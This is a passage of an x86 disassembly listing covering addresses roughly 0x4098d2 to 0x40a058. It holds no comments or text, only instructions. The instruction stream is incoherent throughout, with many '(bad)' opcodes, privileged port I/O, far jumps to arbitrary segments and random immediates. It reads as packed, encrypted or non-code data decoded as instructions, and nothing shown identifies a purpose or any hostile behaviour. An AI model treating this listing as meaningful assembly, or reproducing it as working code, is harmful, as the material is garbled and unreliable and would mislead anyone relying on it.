  4098d2:	mov    ds:0xfe432be4,al
  4098d7:	add    eax,0xc32c011
  4098dc:	or     edi,eax
  4098de:	xchg   ecx,eax
  4098df:	inc    ebp
  4098e0:	push   ds
  4098e1:	dec    ebx
  4098e2:	je     0x409921
  4098e4:	or     edi,DWORD PTR [esi-0x66]
  4098e7:	pushf  
  4098e8:	dec    edx
  4098e9:	outs   dx,BYTE PTR ds:[esi]
  4098ea:	sti    
  4098eb:	sbb    ebx,DWORD PTR [edi-0x3e4b48ac]
  4098f1:	cmp    al,0xd2
  4098f3:	out    dx,eax
  4098f4:	mov    al,ds:0x8ea708ac
  4098f9:	jmp    0x4098a6
  4098fb:	mov    eax,DWORD PTR [eax-0x6]
  4098fe:	pop    edi
  4098ff:	pop    ss
  409900:	fidivr DWORD PTR [edi]
  409902:	jb     0x4098a4
  409904:	arpl   WORD PTR [edi],sp
  409906:	or     al,0x8d
  409908:	test   DWORD PTR [ecx],ebp
  40990a:	ror    BYTE PTR [ebp-0x7a],0xf6
  40990e:	jge    0x4098e0
  409910:	mov    ch,0xf
  409912:	outs   dx,BYTE PTR ds:[esi]
  409913:	repnz in eax,0x27
  409916:	inc    edi
  409917:	mov    eax,ds:0x4c7ac720
  40991c:	lods   eax,DWORD PTR ds:[esi]
  40991d:	xchg   BYTE PTR [ebx-0x68],al
  409920:	loop   0x40998e
  409922:	or     eax,0x74d45d33
  409928:	pop    eax
  409929:	cmp    edi,DWORD PTR [ecx]
  40992b:	and    BYTE PTR [ebp+0x7fedd869],cl
  409931:	push   edi
  409932:	into   
  409933:	fucomp st(1)
  409935:	xchg   ebp,eax
  409936:	shl    DWORD PTR [edx+0x3b],0x71
  40993a:	jle    0x4099ac
  40993c:	icebp  
  40993d:	test   BYTE PTR [edi+0x21],dl
  409940:	mov    ss,ebp
  409942:	jno    0x409940
  409944:	xchg   esp,eax
  409945:	scas   al,BYTE PTR es:[edi]
  409946:	pop    eax
  409947:	xor    eax,0x1c76a5ac
  40994c:	pusha  
  40994d:	fnsave [edx]
  40994f:	jo     0x4098dc
  409951:	push   esp
  409952:	cmc    
  409953:	repnz mov ebp,0xd2630bf1
  409959:	bound  esp,QWORD PTR [edi]
  40995b:	xchg   ebx,eax
  40995c:	add    ah,BYTE PTR [ebx-0x71]
  40995f:	jecxz  0x40995d
  409961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409962:	push   ds
  409963:	lock cdq 
  409965:	stos   BYTE PTR es:[edi],al
  409966:	and    edi,ebp
  409968:	test   BYTE PTR [ebx-0x54],dl
  40996b:	(bad)  
  40996c:	cmp    ebx,ebp
  40996e:	aad    0x35
  409970:	or     DWORD PTR [ebp+eax*2-0x2b],0x3f936081
  409978:	jo     0x409914
  40997a:	sbb    cl,al
  40997c:	shl    ch,cl
  40997e:	loope  0x409978
  409980:	loope  0x4099c7
  409982:	push   ds
  409983:	adc    al,0xe9
  409985:	aaa    
  409986:	pop    es
  409987:	mov    eax,ds:0x83e2ee37
  40998c:	dec    esp
  40998d:	mov    esp,0x6f6fdb0a
  409992:	ficom  DWORD PTR [ecx]
  409994:	jge    0x4099fb
  409996:	dec    eax
  409997:	xor    eax,0x41a7e20f
  40999c:	push   ebx
  40999d:	jne    0x40996d
  40999f:	(bad)  
  4099a0:	lahf   
  4099a1:	sti    
  4099a2:	or     eax,0x9a5753c6
  4099a7:	sub    al,0x6b
  4099a9:	lods   eax,DWORD PTR ds:[esi]
  4099aa:	mov    ss,WORD PTR [ecx]
  4099ac:	(bad)  
  4099ad:	xor    edi,DWORD PTR [eax+edx*8]
  4099b0:	fnstenv [edi+0x48]
  4099b3:	and    DWORD PTR [eax],ebx
  4099b5:	sbb    BYTE PTR [esi],0x67
  4099b8:	out    0x7e,eax
  4099ba:	dec    ecx
  4099bb:	test   dl,bh
  4099bd:	mov    ebp,0x5567a98b
  4099c2:	repz loopne 0x409a0f
  4099c5:	jno    0x4099e5
  4099c7:	cmp    al,0xd4
  4099c9:	inc    edi
  4099ca:	push   ds
  4099cb:	pop    ebp
  4099cc:	dec    eax
  4099cd:	ror    DWORD PTR [ebp-0x30],cl
  4099d0:	fbstp  TBYTE PTR [edi-0x2461e5af]
  4099d6:	mov    al,ds:0xcbf7dbca
  4099db:	aam    0xc9
  4099dd:	ror    DWORD PTR [ebx-0x78edaaf0],0x80
  4099e4:	or     eax,0xe75a6787
  4099e9:	inc    esp
  4099ea:	xlat   BYTE PTR ds:[ebx]
  4099eb:	out    dx,al
  4099ec:	jecxz  0x409a2c
  4099ee:	lahf   
  4099ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099f0:	pushf  
  4099f1:	mov    ecx,0x2320fb5e
  4099f6:	jmp    0xe738:0xbd4f681b
  4099fd:	and    BYTE PTR [ebx-0x11949b76],dl
  409a03:	cwde   
  409a04:	mov    DWORD PTR [esi-0x6cd07fb9],eax
  409a0a:	cmp    BYTE PTR fs:0x60ab117e,bh
  409a11:	pop    esp
  409a12:	mov    cl,0x30
  409a14:	cmp    al,0xf
  409a16:	push   0x51a6c073
  409a1b:	pop    ebp
  409a1c:	sahf   
  409a1d:	fs pushf 
  409a1f:	and    esi,DWORD PTR [ebx]
  409a21:	xchg   esi,eax
  409a22:	out    0x10,al
  409a24:	pop    ds
  409a25:	call   DWORD PTR [ebp-0x1c]
  409a28:	mov    ds:0x97b73946,eax
  409a2d:	js     0x4099f6
  409a2f:	add    ch,cl
  409a31:	add    BYTE PTR [ebx+0x6b9f3963],bl
  409a37:	add    esp,DWORD PTR [edx-0x28ed19db]
  409a3d:	mov    esp,DWORD PTR [ecx+ecx*1]
  409a40:	and    BYTE PTR ds:0x8870f3d9,0x5e
  409a47:	sbb    al,0xc6
  409a49:	xchg   ebx,eax
  409a4a:	mov    esp,0xa51d48b4
  409a4f:	stc    
  409a50:	loope  0x409ac2
  409a52:	retf   
  409a53:	aad    0x2d
  409a55:	or     DWORD PTR [ebx+0x12],eax
  409a58:	sbb    eax,0xf1a8b1d3
  409a5d:	and    ebp,ebx
  409a5f:	dec    ebx
  409a60:	jmp    0x409a12
  409a62:	jp     0x409a82
  409a64:	xlat   BYTE PTR ds:[ebx]
  409a65:	or     cl,BYTE PTR [ebp+0x5e]
  409a68:	push   esp
  409a69:	mov    cl,0xa
  409a6b:	lds    eax,FWORD PTR [ebx+0x2173b205]
  409a71:	adc    eax,0x1352da5
  409a76:	sar    DWORD PTR [ebp+0x3a],cl
  409a79:	pop    ecx
  409a7a:	add    al,0x22
  409a7c:	inc    esi
  409a7d:	xor    ch,BYTE PTR [ebp+0x6c]
  409a80:	(bad)  
  409a81:	push   esi
  409a82:	sbb    eax,0x9116967c
  409a87:	sbb    al,0x54
  409a89:	pop    ss
  409a8a:	lahf   
  409a8b:	sub    bl,BYTE PTR [esi+0x39412bdd]
  409a91:	arpl   WORD PTR [eax+0x3b2b616d],cx
  409a97:	push   edi
  409a98:	lea    ebx,[eax+edx*2-0x3b]
  409a9c:	loope  0x409aad
  409a9e:	xor    DWORD PTR [ebx-0x4582d1d6],ecx
  409aa4:	push   es
  409aa5:	mov    cl,0x84
  409aa7:	xlat   BYTE PTR ds:[ebx]
  409aa8:	iret   
  409aa9:	call   DWORD PTR [esp+ecx*2-0x13]
  409aad:	inc    eax
  409aae:	jp     0x409a36
  409ab0:	dec    edx
  409ab1:	inc    ebp
  409ab2:	fidiv  WORD PTR [eax+0x7d16fd45]
  409ab8:	adc    BYTE PTR [eax+0x5c6236e1],bl
  409abe:	enter  0x94bc,0xb2
  409ac2:	mov    al,0xe4
  409ac4:	sub    DWORD PTR [ecx-0x68],edx
  409ac7:	lahf   
  409ac8:	or     DWORD PTR [edi-0x22d8af53],esp
  409ace:	inc    ebx
  409acf:	xor    al,0x41
  409ad1:	rol    ebp,1
  409ad3:	mov    ah,0xf4
  409ad5:	inc    ecx
  409ad6:	sbb    al,0xb4
  409ad8:	sub    BYTE PTR [ecx+ebx*1],0x3a
  409adc:	out    0xf0,al
  409ade:	mov    DWORD PTR [esi-0x58],ebp
  409ae1:	fsub   DWORD PTR [ecx-0x4403b9ef]
  409ae7:	dec    edx
  409ae8:	popf   
  409ae9:	ja     0x409ab5
  409aeb:	cmp    cl,BYTE PTR ds:0xfc8e97fb
  409af1:	cld    
  409af2:	xor    esp,DWORD PTR [esi]
  409af4:	fnstcw WORD PTR [esi]
  409af6:	out    dx,eax
  409af7:	dec    edi
  409af8:	sbb    eax,eax
  409afa:	xchg   ecx,eax
  409afb:	cmp    BYTE PTR [ecx-0x9],dh
  409afe:	push   esi
  409aff:	and    BYTE PTR [ebp+0xe0878a5],ah
  409b05:	cmp    al,0x5f
  409b07:	sub    al,0x5b
  409b09:	aas    
  409b0a:	mov    ah,0x62
  409b0c:	cmp    DWORD PTR [eax+eiz*8-0x70062417],0xb100ed7
  409b17:	gs int3 
  409b19:	std    
  409b1a:	repnz inc ecx
  409b1c:	cwde   
  409b1d:	fild   DWORD PTR [ecx]
  409b1f:	mov    BYTE PTR fs:[edx-0x56],bh
  409b23:	pextrw ebx,(bad),0xc5
  409b25:	pop    edi
  409b26:	int    0xff
  409b28:	sbb    al,0xad
  409b2a:	push   es
  409b2b:	pusha  
  409b2c:	xor    dh,dh
  409b2e:	cwde   
  409b2f:	pop    ds
  409b30:	aas    
  409b31:	add    ch,ah
  409b33:	test   BYTE PTR [edi-0x405de6d],dh
  409b39:	test   BYTE PTR [esi-0x57],bh
  409b3c:	cli    
  409b3d:	les    ecx,FWORD PTR [esi+0x4a]
  409b40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b41:	pop    ecx
  409b42:	in     eax,0x42
  409b44:	dec    ecx
  409b45:	test   eax,0xfde4a694
  409b4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b4b:	inc    esi
  409b4c:	(bad)  
  409b4d:	cmp    al,0x74
  409b4f:	mov    eax,ds:0xf45028be
  409b54:	dec    ebx
  409b55:	xlat   BYTE PTR ds:[ebx]
  409b56:	fnstcw WORD PTR gs:[eax]
  409b59:	out    dx,eax
  409b5a:	push   0x1f
  409b5c:	cld    
  409b5d:	not    DWORD PTR [eax-0x2696a3d0]
  409b63:	xor    BYTE PTR cs:[ecx],dl
  409b66:	out    0x4c,eax
  409b68:	add    edi,ecx
  409b6a:	sub    BYTE PTR [eax-0x4b],ah
  409b6d:	jmp    0x88d:0xd0a4383f
  409b74:	mov    eax,0x87df2b9c
  409b79:	jo     0x409b3b
  409b7b:	xchg   DWORD PTR [ebp-0x12],ecx
  409b7e:	dec    ebp
  409b7f:	pusha  
  409b80:	push   0x48
  409b82:	ins    DWORD PTR es:[edi],dx
  409b83:	imul   DWORD PTR [edi-0x85a0790]
  409b89:	sbb    al,0xbe
  409b8b:	push   ds
  409b8c:	inc    BYTE PTR [esi+0x210fe3de]
  409b92:	mov    esi,0xbe170ae1
  409b97:	or     al,0xc4
  409b99:	xchg   esi,eax
  409b9a:	test   eax,0xeb52a894
  409b9f:	push   0x85115786
  409ba4:	mov    eax,0x552ad3b
  409ba9:	loop   0x409c28
  409bab:	aam    0x16
  409bad:	ds lahf 
  409baf:	xchg   esi,eax
  409bb0:	inc    edi
  409bb1:	lea    eax,[eax+0xe]
  409bb4:	rol    BYTE PTR [edi+0x491d024d],cl
  409bba:	adc    eax,esi
  409bbc:	cmovle ebx,DWORD PTR [ecx+0x5229220d]
  409bc3:	iret   
  409bc4:	aad    0x76
  409bc6:	sahf   
  409bc7:	imul   eax,DWORD PTR [ebx+0x31],0x1c965c13
  409bce:	mov    cl,0xb2
  409bd0:	sub    eax,0xe777610d
  409bd5:	add    DWORD PTR ds:0x796aed8,ecx
  409bdb:	jecxz  0x409c54
  409bdd:	mov    cl,0x9e
  409bdf:	mov    bl,0xe3
  409be1:	xchg   edi,eax
  409be2:	mov    dl,0xee
  409be4:	cmp    bl,BYTE PTR [edi-0x48eaaf21]
  409bea:	and    cl,dl
  409bec:	(bad)  
  409bed:	lods   al,BYTE PTR ds:[esi]
  409bee:	push   eax
  409bef:	push   ss
  409bf0:	xchg   edi,eax
  409bf1:	nop
  409bf2:	out    0x65,al
  409bf4:	repz mov ds:0x51575e2b,al
  409bfa:	dec    ecx
  409bfb:	xchg   ebx,eax
  409bfc:	sar    edi,0x49
  409bff:	mov    ebp,0xb7798bad
  409c04:	iret   
  409c05:	push   DWORD PTR [ecx-0x430a835c]
  409c0b:	int    0x7e
  409c0d:	xor    dl,0x2d
  409c10:	dec    edi
  409c11:	fild   QWORD PTR [esi]
  409c13:	push   ecx
  409c14:	inc    edx
  409c15:	aaa    
  409c16:	push   esi
  409c17:	pop    edi
  409c18:	cmp    BYTE PTR [ecx+0x73],al
  409c1b:	retf   
  409c1c:	mov    ds:0x9389d491,al
  409c21:	test   eax,0x97e1effe
  409c26:	lods   al,BYTE PTR ds:[esi]
  409c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c28:	or     BYTE PTR [esi-0x22e81209],cl
  409c2e:	lock mov cl,0xc9
  409c31:	and    edi,DWORD PTR [eax]
  409c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c34:	mov    bl,0x77
  409c36:	mov    esp,0x476b779f
  409c3b:	jns    0x409c2f
  409c3d:	and    bh,BYTE PTR [edx+0x22]
  409c40:	sub    bh,BYTE PTR [edx]
  409c42:	lea    ecx,[edi-0x6f605d87]
  409c48:	addr16 mov al,ds:0x33dd
  409c4c:	or     eax,DWORD PTR [ebx-0x69]
  409c4f:	(bad)  
  409c50:	fadd   DWORD PTR [ebp+0xd]
  409c53:	push   ebx
  409c54:	outs   dx,DWORD PTR ds:[esi]
  409c55:	push   0xfffffffb
  409c57:	sub    BYTE PTR [esi+0x119dc324],bh
  409c5d:	mov    ds:0x1fd69106,eax
  409c62:	pop    ecx
  409c63:	cmp    BYTE PTR [eax+0x5f2d38f7],ch
  409c69:	xchg   ebp,eax
  409c6a:	cmp    BYTE PTR [esi-0x43],bh
  409c6d:	dec    edi
  409c6e:	push   ebp
  409c6f:	sub    cl,BYTE PTR [eax-0x1c]
  409c72:	scas   eax,DWORD PTR es:[edi]
  409c73:	stos   BYTE PTR es:[edi],al
  409c74:	or     dh,BYTE PTR ds:0x76bb83b7
  409c7a:	add    edi,ebx
  409c7c:	cmp    eax,0x580bda15
  409c81:	push   0x8a77d867
  409c86:	fistp  QWORD PTR [esi]
  409c88:	mov    BYTE PTR [ebx],bh
  409c8a:	mov    cs,WORD PTR [esi]
  409c8c:	mov    DWORD PTR ds:0x7902b765,ebx
  409c92:	inc    esp
  409c93:	imul   edi,ecx,0x55950841
  409c99:	cld    
  409c9a:	pusha  
  409c9b:	les    edi,FWORD PTR [edi-0x2b5e4486]
  409ca1:	test   eax,0xa17d357f
  409ca6:	les    edi,FWORD PTR [eax+ecx*2]
  409ca9:	lods   eax,DWORD PTR ds:[esi]
  409caa:	pop    esp
  409cab:	push   esp
  409cac:	ins    BYTE PTR es:[edi],dx
  409cad:	xor    al,0x8e
  409caf:	retf   
  409cb0:	aas    
  409cb1:	popf   
  409cb2:	(bad)  
  409cb3:	cld    
  409cb4:	cmp    eax,0xbed18eca
  409cb9:	pop    edi
  409cba:	adc    DWORD PTR [ebp+esi*4-0x6a],ecx
  409cbe:	shr    DWORD PTR [eax-0x74],cl
  409cc1:	sub    BYTE PTR [edi],dh
  409cc3:	and    bh,BYTE PTR [eax]
  409cc5:	cmp    DWORD PTR [edx+0x74],edi
  409cc8:	xchg   ebp,eax
  409cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cca:	xchg   edi,eax
  409ccb:	popa   
  409ccc:	push   ecx
  409ccd:	sub    BYTE PTR [edi+eax*4-0x50a7a35b],cl
  409cd4:	ficomp DWORD PTR cs:[ebp-0x71]
  409cd8:	sbb    esi,edi
  409cda:	xchg   esi,eax
  409cdb:	in     eax,0xb3
  409cdd:	jmp    0xf2842209
  409ce2:	int    0xf9
  409ce4:	add    eax,0x4a68cedc
  409ce9:	mov    dl,0xf3
  409ceb:	add    eax,0x1b228d19
  409cf0:	mov    bl,BYTE PTR [esi]
  409cf2:	mov    bl,0xe8
  409cf4:	(bad)  
  409cf5:	(bad)  
  409cf6:	fsub   DWORD PTR [edi]
  409cf8:	and    BYTE PTR [esi],0x6d
  409cfb:	dec    esp
  409cfc:	sub    cl,BYTE PTR ds:0x986bba4d
  409d02:	call   0xad13:0xfb370ca7
  409d09:	xchg   edi,eax
  409d0a:	les    esi,FWORD PTR [ebx+0x5c1ecf94]
  409d10:	add    al,ah
  409d12:	hlt    
  409d13:	adc    al,0x9a
  409d15:	nop
  409d16:	lds    esi,FWORD PTR [ecx+0x1521d551]
  409d1c:	jecxz  0x409cb3
  409d1e:	mov    al,ds:0xa46f57f1
  409d23:	shl    dh,cl
  409d25:	mov    esi,DWORD PTR [eax]
  409d27:	mov    ds:0xcee2a273,al
  409d2c:	cmc    
  409d2d:	cdq    
  409d2e:	adc    BYTE PTR [ecx-0x4],cl
  409d31:	xchg   edi,eax
  409d32:	retf   0xa284
  409d35:	add    BYTE PTR ds:0xbaad3769,dl
  409d3b:	(bad)  
  409d3c:	sahf   
  409d3d:	lods   eax,DWORD PTR ds:[esi]
  409d3e:	pop    es
  409d3f:	cmp    eax,0x40b04fa8
  409d44:	pusha  
  409d45:	out    0xc6,al
  409d47:	iret   
  409d48:	xchg   edx,eax
  409d49:	popa   
  409d4a:	xchg   DWORD PTR [eax-0x6c],ecx
  409d4d:	clc    
  409d4e:	add    edi,DWORD PTR [ecx-0xea248e5]
  409d54:	and    dh,ah
  409d56:	(bad)  
  409d57:	rol    dh,cl
  409d59:	ror    BYTE PTR fs:[edi-0x6001faf4],cl
  409d60:	stos   BYTE PTR es:[edi],al
  409d61:	pop    es
  409d62:	mov    dh,0x2a
  409d64:	mov    ebx,0x3e17632e
  409d69:	retf   0x19ae
  409d6c:	sbb    eax,0x40d1962
  409d71:	lahf   
  409d72:	and    al,0xa9
  409d74:	in     eax,dx
  409d75:	jp     0x409d61
  409d77:	mov    al,0xb7
  409d79:	cmp    eax,0xdd7ca35f
  409d7e:	fild   QWORD PTR [ebp+edi*2+0x6a0f0b03]
  409d85:	sahf   
  409d86:	call   0x4291:0x85780d71
  409d8d:	jb     0x409d6b
  409d8f:	inc    ecx
  409d90:	mov    dl,0x95
  409d92:	cld    
  409d93:	ret    0x7bc9
  409d96:	adc    BYTE PTR es:[edi],al
  409d99:	es or  dh,cl
  409d9c:	stc    
  409d9d:	out    0xa0,al
  409d9f:	shl    DWORD PTR [esi],0xce
  409da2:	outs   dx,BYTE PTR cs:[esi]
  409da4:	cmp    eax,0xbbf3b4bc
  409da9:	push   edx
  409daa:	xchg   DWORD PTR [ecx],ebp
  409dac:	cmp    DWORD PTR [ebp+0x49613b46],esi
  409db2:	inc    eax
  409db3:	sbb    DWORD PTR [eax-0x1c],0xffffffb3
  409db7:	push   es
  409db8:	push   edi
  409db9:	shl    edi,cl
  409dbb:	dec    edi
  409dbc:	inc    edx
  409dbd:	jmp    0x409d55
  409dbf:	scas   al,BYTE PTR es:[edi]
  409dc0:	(bad)  
  409dc1:	repnz das 
  409dc3:	(bad)  
  409dc4:	in     al,dx
  409dc5:	lock retf 
  409dc7:	out    0x50,al
  409dc9:	and    DWORD PTR [esi-0x51],ebp
  409dcc:	div    BYTE PTR [ebp+0x67e43786]
  409dd2:	adc    dh,ch
  409dd4:	and    esp,ebp
  409dd6:	cs sub al,0x40
  409dd9:	push   ss
  409dda:	or     DWORD PTR [edi+eiz*2+0x67],edx
  409dde:	sbb    DWORD PTR [ecx-0x29981654],ebp
  409de4:	add    eax,0x27b21aae
  409de9:	jnp    0x409db1
  409deb:	cwde   
  409dec:	xor    eax,0x82053bf3
  409df1:	push   ss
  409df2:	popa   
  409df3:	dec    ebx
  409df4:	popa   
  409df5:	popf   
  409df6:	adc    BYTE PTR [edx+0x2dfd32ce],bl
  409dfc:	lods   al,BYTE PTR ds:[esi]
  409dfd:	cmp    DWORD PTR [edi+0x33],edi
  409e00:	jl     0x409dc1
  409e02:	push   esi
  409e03:	aaa    
  409e04:	cmp    BYTE PTR ds:0x4debca6d,0xc6
  409e0b:	inc    edi
  409e0c:	test   BYTE PTR [eax+0x2e],dh
  409e0f:	js     0x409dc7
  409e11:	mov    bl,0xa9
  409e13:	sub    DWORD PTR [esi],edx
  409e15:	pop    ds
  409e16:	iret   
  409e17:	pop    ss
  409e18:	adc    eax,0x277f4f33
  409e1d:	xor    dl,BYTE PTR [eax-0x6754113a]
  409e23:	sbb    eax,DWORD PTR [ebx]
  409e25:	adc    edi,ebp
  409e27:	push   es
  409e28:	pop    esi
  409e29:	lea    ecx,[edi-0x18bb1f6e]
  409e2f:	arpl   WORD PTR [edx],di
  409e31:	jge    0x409e6b
  409e33:	pusha  
  409e34:	xor    BYTE PTR [eax+0x24],cl
  409e37:	jle    0x409e81
  409e39:	cmc    
  409e3a:	xchg   ebx,eax
  409e3b:	sub    al,0xaf
  409e3d:	jae    0x409e67
  409e3f:	jno    0x409e1e
  409e41:	les    edx,FWORD PTR [ebx-0x25]
  409e44:	mov    eax,0x14fcabae
  409e49:	out    0xaa,al
  409e4b:	(bad)  
  409e4c:	pop    ebx
  409e4d:	dec    ebp
  409e4e:	lea    ebp,[ecx-0x3206fe09]
  409e54:	add    al,0x81
  409e56:	fwait
  409e57:	adc    al,0xb2
  409e59:	jno    0x409e96
  409e5b:	das    
  409e5c:	jbe    0x409ecb
  409e5e:	scas   eax,DWORD PTR es:[edi]
  409e5f:	push   edx
  409e60:	pusha  
  409e61:	push   cs
  409e62:	push   esi
  409e63:	imul   edi,DWORD PTR [esi],0x1e53d347
  409e69:	outs   dx,BYTE PTR ds:[esi]
  409e6a:	enter  0x31f1,0x44
  409e6e:	(bad)  
  409e6f:	fcom   QWORD PTR [edi]
  409e71:	push   cs
  409e72:	frstor [edx+0x1bd0e8ba]
  409e78:	inc    ecx
  409e79:	jnp    0x409ed8
  409e7b:	stos   BYTE PTR es:[edi],al
  409e7c:	mov    esi,0x7af7064f
  409e81:	mov    cl,0x8e
  409e83:	mov    DWORD PTR [esi],edx
  409e85:	pop    esi
  409e86:	or     esi,eax
  409e88:	cmp    eax,0x53cfc71d
  409e8d:	repz out 0xe,al
  409e90:	mov    al,BYTE PTR [ecx+0x52]
  409e93:	dec    edi
  409e94:	stos   DWORD PTR es:[edi],eax
  409e95:	sbb    ebx,edx
  409e97:	mov    ds:0x9b2e715e,al
  409e9c:	das    
  409e9d:	cli    
  409e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e9f:	mov    dh,0x41
  409ea1:	cwde   
  409ea2:	jp     0x409f0b
  409ea4:	cwde   
  409ea5:	and    ebp,DWORD PTR [esi-0x8]
  409ea8:	or     eax,0xbe3add40
  409ead:	ret    
  409eae:	aad    0xd0
  409eb0:	jge    0x409f29
  409eb2:	cld    
  409eb3:	ja     0x409f0e
  409eb5:	mov    ds:0xdf771df8,al
  409eba:	into   
  409ebb:	mov    ch,cl
  409ebd:	neg    DWORD PTR [esi-0x47]
  409ec0:	sbb    DWORD PTR [eax],ecx
  409ec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ec3:	and    BYTE PTR [eax-0x18],bh
  409ec6:	mov    ah,0x39
  409ec8:	mov    al,0x22
  409eca:	push   edi
  409ecb:	test   BYTE PTR [eax-0x4f],al
  409ece:	sahf   
  409ecf:	call   0xf3ed2a8c
  409ed4:	sbb    al,0x34
  409ed6:	jmp    0x5ad42e34
  409edb:	scas   al,BYTE PTR es:[edi]
  409edc:	repnz es std 
  409edf:	mov    esp,0x9547d5aa
  409ee4:	cmp    BYTE PTR [ebx-0x2d9662fe],0x7c
  409eeb:	(bad)  
  409eec:	out    0x82,eax
  409eee:	xor    al,0xdb
  409ef0:	ret    
  409ef1:	lea    eax,[edi]
  409ef3:	call   0xaba58f3a
  409ef8:	dec    eax
  409ef9:	xor    dl,ch
  409efb:	idiv   BYTE PTR [edi+eax*1]
  409efe:	or     eax,0x24c9cb2a
  409f03:	imul   cl
  409f05:	xchg   edx,eax
  409f06:	lds    eax,FWORD PTR [esi-0xcfa63d3]
  409f0c:	jno    0x409f50
  409f0e:	pop    es
  409f0f:	icebp  
  409f10:	mov    fs,WORD PTR [ecx+ecx*8+0xecf4c5]
  409f17:	push   es
  409f18:	scas   al,BYTE PTR es:[edi]
  409f19:	sahf   
  409f1a:	and    BYTE PTR [ebx+0xd],0xed
  409f1e:	das    
  409f1f:	clc    
  409f20:	dec    edx
  409f21:	xor    al,0xf0
  409f23:	sbb    ecx,DWORD PTR [edi-0x371b89e0]
  409f29:	mov    al,0x83
  409f2b:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  409f2d:	adc    eax,0x4037d2fc
  409f32:	cli    
  409f33:	loope  0x409f9d
  409f35:	(bad)  
  409f37:	adc    DWORD PTR [ecx+0x28],esi
  409f3a:	lds    ebp,FWORD PTR ds:0xa19be78e
  409f40:	jno    0x409ee1
  409f42:	jmp    0x96052196
  409f47:	shl    dh,0x6f
  409f4a:	fsubr  st(7),st
  409f4c:	push   eax
  409f4d:	stos   BYTE PTR es:[edi],al
  409f4e:	popa   
  409f4f:	data16 mov ds:0xb0f8749,al
  409f55:	aad    0x28
  409f57:	push   ebp
  409f58:	sub    bh,ch
  409f5a:	xchg   BYTE PTR [ebp+0x5d],al
  409f5d:	push   es
  409f5e:	mov    ch,0x33
  409f60:	(bad)
  409f63:	jb     0x409f82
  409f65:	mov    ch,0xcf
  409f67:	cmc    
  409f68:	jmp    0x10c4:0xd8086e33
  409f6f:	leave  
  409f70:	aad    0x65
  409f72:	sbb    eax,0x7ccea3a9
  409f77:	jae    0x409f54
  409f79:	xchg   edi,eax
  409f7a:	mov    bh,0xdd
  409f7c:	jbe    0x409fbf
  409f7e:	inc    edi
  409f7f:	push   0xffffffb3
  409f81:	jo     0x409fc7
  409f83:	pop    ss
  409f84:	pop    ebx
  409f85:	push   ds
  409f86:	(bad)  
  409f87:	xlat   BYTE PTR ds:[ebx]
  409f88:	sub    dl,dl
  409f8a:	jno    0x409f2e
  409f8c:	inc    ebx
  409f8d:	ficomp WORD PTR [ebp*8-0x44b2eb60]
  409f94:	sbb    eax,0x9a36ff82
  409f99:	inc    esi
  409f9a:	cmp    ebx,DWORD PTR [edx+0x47]
  409f9d:	les    ecx,FWORD PTR [ebx-0x49834dd2]
  409fa3:	gs adc cl,ch
  409fa6:	int    0x6
  409fa8:	pop    ds
  409fa9:	outs   dx,DWORD PTR ds:[esi]
  409faa:	hlt    
  409fab:	enter  0x17b9,0xad
  409faf:	pop    eax
  409fb0:	cdq    
  409fb1:	jne    0x409f3a
  409fb3:	daa    
  409fb4:	mov    bl,0x9d
  409fb6:	add    eax,DWORD PTR [ebx]
  409fb8:	out    0xa5,al
  409fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fbb:	fmul   DWORD PTR [eax]
  409fbd:	mov    edx,0x4bbde0cb
  409fc2:	adc    al,0x32
  409fc4:	pop    ecx
  409fc5:	sub    ecx,DWORD PTR [eax+0x3590ab]
  409fcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fcc:	pop    edi
  409fcd:	sub    eax,0xfb0f280
  409fd2:	mov    dl,0xf
  409fd4:	or     BYTE PTR [eax-0x57],0xa6
  409fd8:	mov    ds:0xb43a0b2e,eax
  409fdd:	jecxz  0x409f8d
  409fdf:	fidivr DWORD PTR [esi]
  409fe1:	nop
  409fe2:	sub    ebx,eax
  409fe4:	clc    
  409fe5:	xor    eax,0xf691b92e
  409fea:	inc    esi
  409feb:	cmc    
  409fec:	into   
  409fed:	jbe    0x40a062
  409fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ff0:	inc    eax
  409ff1:	fs pop edi
  409ff3:	jnp    0x40a05d
  409ff5:	ret    0x493
  409ff8:	pop    edx
  409ff9:	cmp    BYTE PTR [esi],ch
  409ffb:	jo     0x40a06d
  409ffd:	lea    ebx,[edi-0x3d]
  40a000:	cmp    ebx,ecx
  40a002:	es fs push ebp
  40a005:	(bad)  
  40a006:	lods   eax,DWORD PTR ds:[esi]
  40a007:	dec    ebx
  40a008:	jne    0x40a077
  40a00a:	test   al,0xf4
  40a00c:	xchg   esp,eax
  40a00d:	sbb    bl,ch
  40a00f:	popf   
  40a010:	sti    
  40a011:	pop    eax
  40a012:	out    dx,al
  40a013:	cmp    edi,ecx
  40a015:	sti    
  40a016:	or     DWORD PTR [ebx+0x4d],ebp
  40a019:	lods   al,BYTE PTR ds:[esi]
  40a01a:	jno    0x40a02a
  40a01c:	jle    0x409fdd
  40a01e:	cmp    ebx,DWORD PTR [ecx+0x79]
  40a021:	ret    0xdbf5
  40a024:	fwait
  40a025:	mov    WORD PTR ss:[ecx+ecx*1-0x2f],?
  40a02a:	inc    ebp
  40a02b:	lock in al,0x55
  40a02e:	xor    bl,BYTE PTR [ecx]
  40a030:	mov    WORD PTR [ebp+0x7e07a61e],fs
  40a036:	lahf   
  40a037:	adc    eax,esp
  40a039:	xor    ecx,DWORD PTR [eax+0x4b]
  40a03c:	push   ebx
  40a03d:	pop    ecx
  40a03e:	pop    ds
  40a03f:	imul   ecx,DWORD PTR [eax-0x44],0xffffff80
  40a043:	mov    ds:0x19815367,eax
  40a048:	(bad)  
  40a049:	mov    WORD PTR [eax+ebx*8+0x4d00d9a8],fs
  40a050:	pusha  
  40a051:	mov    ch,BYTE PTR [edx-0x66247690]
  40a057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a058:	xchg   esi,eax
